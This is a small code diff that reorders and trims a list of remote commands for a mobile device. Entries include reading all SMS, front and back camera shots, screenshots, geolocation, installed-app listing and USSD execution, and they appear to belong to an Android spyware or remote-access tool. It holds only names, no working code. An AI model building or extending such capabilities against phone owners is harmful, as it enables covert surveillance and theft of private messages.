@@ -2,9 +2,9 @@
     [
         "openUrl", "sendToast", "vibratePhone",
         "getGeoLocation", "receiveSMS",
-        "getInstalledApps", "runUSSD",
+        "getInstalledApps",
         "lockScreen", "unlockScreen",
-        "sendNotification"
+        "runUSSD"
     ],
     [
         "getAllSMS", "takeScreenshot", "takeBackshot", "takeFrontshot", "setSoundVolume",
